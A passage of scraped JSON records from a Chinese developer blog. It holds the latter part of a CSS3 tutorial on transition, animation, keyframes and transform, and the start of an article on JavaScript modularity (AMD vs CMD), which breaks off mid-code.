cubic-\nbezier(n,n,n,n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上具体取值含义如下：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003cth\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003elinear\u003c/td\u003e\n\u003ctd\u003e规定以相同速度开始至结束的过渡效果。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eease\u003c/td\u003e\n\u003ctd\u003e规定慢速开始，然后变快，然后慢速结束的过渡效果。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eease-in\u003c/td\u003e\n\u003ctd\u003e规定以慢速开始的过渡效果。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eease-out\u003c/td\u003e\n\u003ctd\u003e规定以慢速结束的过渡效果。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eease-in-out\u003c/td\u003e\n\u003ctd\u003e规定以慢速开始和结束的过渡效果。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ecubic-bezier(\u003cem\u003en\u003c/em\u003e,\u003cem\u003en\u003c/em\u003e,\u003cem\u003en\u003c/em\u003e,\u003cem\u003en\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e在 cubic-bezier 函数中定义自己的值。可能的值是 0 至 1 之间的数值。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003e4. transition-delay\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etransition-delay: time;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003etransition-delay\u003c/code\u003e是用来指定一个动画开始执行的时间，也就是说当改变元素属性值后多长时间开始执行\u003ccode\u003etransition\u003c/code\u003e效果，其取值time为数值，单位为s（秒）或者ms(毫秒)， 默认大小是\"0\"，也就是变换立即执行，没有延迟。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e5. 示例\u003c/h3\u003e\n\u003cp\u003ehtml代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"one\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ecss代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.one\u003c/span\u003e {\n        \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n        \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n        \u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e auto;\n        \u003cspan class=\"hljs-attribute\"\u003ebackground-color\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#cd4a48\u003c/span\u003e;\n        \u003cspan class=\"hljs-attribute\"\u003e-webkit-transition\u003c/span\u003e: width, height \u003cspan class=\"hljs-number\"\u003e2s\u003c/span\u003e ease;\n        \u003cspan class=\"hljs-attribute\"\u003e-moz-transition\u003c/span\u003e: width, height \u003cspan class=\"hljs-number\"\u003e2s\u003c/span\u003e ease;\n        \u003cspan class=\"hljs-attribute\"\u003e-ms-transition\u003c/span\u003e: width, height \u003cspan class=\"hljs-number\"\u003e2s\u003c/span\u003e ease;\n        \u003cspan class=\"hljs-attribute\"\u003e-o-transition\u003c/span\u003e: width, height \u003cspan class=\"hljs-number\"\u003e2s\u003c/span\u003e ease;\n        \u003cspan class=\"hljs-attribute\"\u003etransition\u003c/span\u003e: width, height \u003cspan class=\"hljs-number\"\u003e2s\u003c/span\u003e ease;\n    }\n\n    \u003cspan class=\"hljs-selector-class\"\u003e.one\u003c/span\u003e\u003cspan class=\"hljs-selector-pseudo\"\u003e:hover\u003c/span\u003e {\n        \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e300px\u003c/span\u003e;\n        \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e300px\u003c/span\u003e;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/16092f2e42bcea2b?w=921\u0026amp;h=532\u0026amp;f=gif\u0026amp;s=8407\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e6. 注意事项\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e不是所有的CSS属性都支持\u003ccode\u003etransition\u003c/code\u003e，完整的列表查看\u003ca target=\"_blank\" href=\"http://oli.jp/2010/css-animatable-properties/\"\u003e这里\u003c/a\u003e，以及具体的\u003ca target=\"_blank\" href=\"http://leaverou.github.io/animatable/\"\u003e效果\u003c/a\u003e。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etransition\u003c/code\u003e需要明确知道，开始状态和结束状态的具体数值，才能计算出中间状态。比如，height从0px变化到100px，\u003ccode\u003etransition\u003c/code\u003e可以算出中间状态。但是，\u003ccode\u003etransition\u003c/code\u003e没法算出0px到auto的中间状态，也就是说，如果开始或结束的设置是height: auto，那么就不会产生动画效果。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etransition\u003c/code\u003e需要事件触发，所以没法在网页加载时自动发生。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etransition\u003c/code\u003e是一次性的，不能重复发生，除非一再触发。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e二、animation\u003c/h2\u003e\n\u003cp\u003e不同于\u003ccode\u003etransition\u003c/code\u003e只能定义首尾两个状态，\u003ccode\u003eanimation\u003c/code\u003e可以定义任意多的关键帧，因而能实现更复杂的动画效果。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eanimation: animation-name || animation-duration || animation-timing-function || animation-delay || animation-iteration-count || animation-direction\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eanimation\u003c/code\u003e主要包含六个属性，具体含义如下：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003cth\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003eanimation-name\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e规定需要绑定到选择器的 keyframe 名称。。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003eanimation-duration\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e规定完成动画所花费的时间，以秒或毫秒计。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003eanimation-timing-function\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e规定动画的速度曲线。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003eanimation-delay\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e规定在动画开始之前的延迟，默认值为0。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003eanimation-iteration-count\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e规定动画应该播放的次数，默认值为1。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003eanimation-direction\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e规定是否应该轮流反向播放动画，默认值是正向。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003e1. keyframe\u003c/h3\u003e\n\u003cp\u003e在介绍\u003ccode\u003eanimation\u003c/code\u003e具体使用之前，要先介绍keyframe。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e@keyframes\u003c/code\u003e 让开发者通过指定动画中特定时间点必须展现的关键帧样式（或者说停留点）来控制CSS动画的中间环节。这让开发者能够控制动画中的更多细节而不是全部让浏览器自动处理。\u003c/p\u003e\n\u003cp\u003e要使用关键帧, 先创建一个带名称的\u003ccode\u003e@keyframes\u003c/code\u003e规则，以便后续使用 \u003ccode\u003eanimation-name\u003c/code\u003e这个属性来调用指定的\u003ccode\u003e@keyframes\u003c/code\u003e. 每个\u003ccode\u003e@keyframes\u003c/code\u003e 规则包含多个关键帧，也就是一段样式块语句，每个关键帧有一个百分比值作为名称，代表在动画进行中，在哪个阶段触发这个帧所包含的样式。\u003c/p\u003e\n\u003cp\u003e关键帧的编写顺序没有要求，最后只会根据百分比按由小到大的顺序触发。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e@keyframes animationname {keyframes-selector {css-styles;}}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e具体含义如下：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003cth\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003eanimationname\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e必需。定义动画的名称。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003ekeyframes-selector\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e必需。动画时长的百分比。合法的值：0-100%from（与 0% 相同）to（与 100% 相同）\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cem\u003ecss-styles\u003c/em\u003e\u003c/td\u003e\n\u003ctd\u003e必需。一个或多个合法的 CSS 样式属性。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e@\u003cspan class=\"hljs-keyword\"\u003ekeyframes\u003c/span\u003e identifier {\n  0% { \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0px\u003c/span\u003e}\n  50% { \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30px\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e; }\n  100% { \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e30px\u003c/span\u003e;}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2. 示例\u003c/h3\u003e\n\u003cp\u003ehtml代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"one\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ecss代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.one\u003c/span\u003e {\n        \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n        \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n        \u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e auto;\n        \u003cspan class=\"hljs-attribute\"\u003ebackground-color\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#cd4a48\u003c/span\u003e;\n        \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: relative;\n        \u003cspan class=\"hljs-attribute\"\u003eanimation\u003c/span\u003e: moveHover \u003cspan class=\"hljs-number\"\u003e5s\u003c/span\u003e ease-in-out \u003cspan class=\"hljs-number\"\u003e0.2s\u003c/span\u003e;\n\n    }\n\n\n    @\u003cspan class=\"hljs-keyword\"\u003ekeyframes\u003c/span\u003e moveHover {\n        0% {\n            \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#cd4a48\u003c/span\u003e;\n        }\n        50% {\n            \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e#A48992\u003c/span\u003e;\n        }\n        100% {\n            \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e350px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e350px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#FFB89A\u003c/span\u003e;\n        }\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/26/16092f2e4576db07?w=921\u0026amp;h=532\u0026amp;f=gif\u0026amp;s=14521\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3. 其他属性\u003c/h3\u003e\n\u003cp\u003e除了上述主要用到的六个属性外，还要额外介绍两个属性。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eanimation-fill-mode\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e动画结束以后，会立即从结束状态跳回到起始状态。如果想让动画保持在结束状态，需要使用\u003ccode\u003eanimation-fill-mode\u003c/code\u003e属性。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eanimation-fill-mode: none || backwards || both\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003enone：默认值，回到动画没开始时的状态。\u003c/li\u003e\n\u003cli\u003eforwards：当动画完成后，保持最后一个属性值（在最后一个关键帧中定义）。\u003c/li\u003e\n\u003cli\u003ebackwards：在 \u003ccode\u003eanimation-delay\u003c/code\u003e所指定的一段时间内，在动画显示之前，应用开始属性值（在第一个关键帧中定义）。\u003c/li\u003e\n\u003cli\u003eboth: 根据\u003ccode\u003eanimation-direction\u003c/code\u003e轮流应用forwards和backwards规则。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eanimation-play-state\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e有时，动画播放过程中，会突然停止。这时，默认行为是跳回到动画的开始状态。\u003c/p\u003e\n\u003cp\u003e如果想让动画保持突然终止时的状态，就要使用\u003ccode\u003eanimation-play-state\u003c/code\u003e属性。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eanimation-play-state:running || paused\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eanimation-play-state\u003c/code\u003e主要是用来控制元素动画的播放状态。其主要有两个值，running和paused其中running为默认值。通过paused将正在播放的动画停下了，通过running将暂停的动画重新播放，这个属性目前很少内核支持。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e三、transform\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003etransform\u003c/code\u003e就是变形，主要包括\u003cstrong\u003e旋转rotate\u003c/strong\u003e、\u003cstrong\u003e扭曲skew\u003c/strong\u003e、\u003cstrong\u003e缩放scale\u003c/strong\u003e和\u003cstrong\u003e移动translate\u003c/strong\u003e以及\u003cstrong\u003e矩阵变形matrix\u003c/strong\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etransform: none || transform-functions\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003enone:表示不进么变换；transform-function表示一个或多个变换函数，以空格分开；换句话说就是我们同时对一个元素进行transform的多种属性操作，例如rotate、scale、translate三种。\u003c/p\u003e\n\u003cp\u003e主要的transform-function变换函数如下：\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1. translate\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003cth\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003etranslate(\u003cem\u003ex\u003c/em\u003e,\u003cem\u003ey\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义 2D 转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etranslate3d(\u003cem\u003ex\u003c/em\u003e,\u003cem\u003ey\u003c/em\u003e,\u003cem\u003ez\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义 3D 转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etranslateX(\u003cem\u003ex\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义转换，只是用 X 轴的值。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etranslateY(\u003cem\u003ey\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义转换，只是用 Y 轴的值。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etranslateZ(\u003cem\u003ez\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义 3D 转换，只是用 Z 轴的值。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003e2. scale\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003cth\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003escale(\u003cem\u003ex\u003c/em\u003e,\u003cem\u003ey\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义 2D 缩放转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003escale3d(\u003cem\u003ex\u003c/em\u003e,\u003cem\u003ey\u003c/em\u003e,\u003cem\u003ez\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义 3D 缩放转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003escaleX(\u003cem\u003ex\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e通过设置 X 轴的值来定义缩放转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003escaleY(\u003cem\u003ey\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e通过设置 Y 轴的值来定义缩放转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003escaleZ(\u003cem\u003ez\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e通过设置 Z 轴的值来定义 3D 缩放转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003e3. rotate\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003cth\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003erotate(\u003cem\u003eangle\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义 2D 旋转，在参数中规定角度。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003erotate3d(\u003cem\u003ex\u003c/em\u003e,\u003cem\u003ey\u003c/em\u003e,\u003cem\u003ez\u003c/em\u003e,\u003cem\u003eangle\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义 3D 旋转。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003erotateX(\u003cem\u003eangle\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义沿着 X 轴的 3D 旋转。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003erotateY(\u003cem\u003eangle\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义沿着 Y 轴的 3D 旋转。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003erotateZ(\u003cem\u003eangle\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义沿着 Z 轴的 3D 旋转。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003e4. skew\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003cth\u003e描述\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eskew(\u003cem\u003ex-angle\u003c/em\u003e,\u003cem\u003ey-angle\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义沿着 X 和 Y 轴的 2D 倾斜转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eskewX(\u003cem\u003eangle\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义沿着 X 轴的 2D 倾斜转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eskewY(\u003cem\u003eangle\u003c/em\u003e)\u003c/td\u003e\n\u003ctd\u003e定义沿着 Y 轴的 2D 倾斜转换。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003e5. transform-origin\u003c/h3\u003e\n\u003cp\u003e以上变化的默认参照点是元素的中心点，不过可以通过\u003ccode\u003etransform-origin\u003c/code\u003e设置元素的参照点。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003etransform-origin: X || Y || Z\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中X，Y，Z对应三维坐标，X，Y，Z的值可以是em，px。此外，X，Y可以是百分值，其中X也可以是字符参数值left，center，right。Y和X一样除了百分值外还可以设置字符值top，center，bottom。\u003c/p\u003e\n\u003cp\u003e具体示例就不再写了，情况比较多，实现起来也比较简单。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e四、总结\u003c/h2\u003e\n\u003cp\u003e以上是关于CSS3中制作动画的三个属性，内容比较基础，不过却很实用。仅仅只需要CSS，即可实现一些较为简单的动画效果，省去了复杂的js代码。\u003c/p\u003e\n","buildTime":"1514974596.571","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac40336c"},"id":"5a422b036fb9a045211ef789","author":{"$oid":"5a4cc38785472a29ac40334e"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"前端模块化，AMD与CMD的区别","meta":{"likeCount":0},"tag":["JavaScript","前端","RequireJS","浏览器"],"comment":[],"shortContent":"最近在研究cmd和amd，在网上看到一篇不错的文章，整理下看看。 遗憾的是JavaScript在设计时定位原因，没有提供类似的功能，开发者需要模拟出类似的功能，来隔离、组织复杂的JavaScript代码，我们称为模块化。 一个模块就是实现特定功能的文件，有了模块，我们就可以更方…","content":"\u003cdiv\u003e\u003cdiv\u003e原创 2016年08月03日 17:15:51\u003c/div\u003e\u003cul\u003e\u003cli\u003e标签：\u003c/li\u003e\u003cli\u003e\u003ca href=\"http://so.csdn.net/so/search/s.do?q=javascript\u0026amp;t=blog\"\u003ejavascript\u003c/a\u003e /\u003c/li\u003e\u003cli\u003e\u003ca href=\"http://so.csdn.net/so/search/s.do?q=%E6%A8%A1%E5%9D%97%E5%8C%96\u0026amp;t=blog\"\u003e模块化\u003c/a\u003e /\u003c/li\u003e\u003cli\u003e\u003ca href=\"http://so.csdn.net/so/search/s.do?q=%E5%89%8D%E7%AB%AF\u0026amp;t=blog\"\u003e前端\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003cul\u003e\u003cli\u003e\u003cdiv\u003e\u003ci\u003e\u003c/i\u003e21234\u003c/div\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cp\u003e最近在研究cmd和amd，在网上看到一篇不错的文章，整理下看看。 \u003cbr\u003e在JavaScript发展初期就是为了实现简单的页面交互逻辑，寥寥数语即可；如今CPU、浏览器性能得到了极大的提升，很多页面逻辑迁移到了客户端（表单验证等），随着web2.0时代的到来，Ajax技术得到广泛应用，jQuery等前端库层出不穷，前端代码日益膨胀\u003c/p\u003e\u003cp\u003e这时候JavaScript作为嵌入式的脚本语言的定位动摇了，JavaScript却没有为组织代码提供任何明显帮助，甚至没有类的概念，更不用说模块（module）了，JavaScript极其简单的代码组织规范不足以驾驭如此庞大规模的代码\u003c/p\u003e\u003ch2\u003e模块\u003c/h2\u003e\u003cp\u003e既然JavaScript不能handle如此大规模的代码，我们可以借鉴一下其它语言是怎么处理大规模程序设计的，在Java中有一个重要带概念——package，逻辑上相关的代码组织到同一个包内，包内是一个相对独立的王国，不用担心命名冲突什么的，那么外部如果使用呢？直接import对应的package即可\u003c/p\u003e\u003cp\u003eimport java.util.ArrayList; \u003cbr\u003e遗憾的是JavaScript在设计时定位原因，没有提供类似的功能，开发者需要模拟出类似的功能，来隔离、组织复杂的JavaScript代码，我们称为模块化。\u003c/p\u003e\u003cp\u003e一个模块就是实现特定功能的文件，有了模块，我们就可以更方便地使用别人的代码，想要什么功能，就加载什么模块。模块开发需要遵循一定的规范，各行其是就都乱套了\u003c/p\u003e\u003cp\u003e规范形成的过程是痛苦的，前端的先驱在刀耕火种、茹毛饮血的阶段开始，发展到现在初具规模，简单了解一下这段不凡的历程\u003c/p\u003e\u003cp\u003e\u003cb\u003e函数封装\u003c/b\u003e\u003c/p\u003e\u003cp\u003e我们在讲函数的时候提到，函数一个功能就是实现特定逻辑的一组语句打包，而且JavaScript的作用域就是基于函数的，所以把函数作为模块化的第一步是很自然的事情，在一个文件里面编写几个相关函数就是最开始的模块了\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efn1\u003c/span\u003e\u003c/span\u003e(){\n    statement\n}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efn2\u003c/span\u003e\u003c/span\u003e(){\n    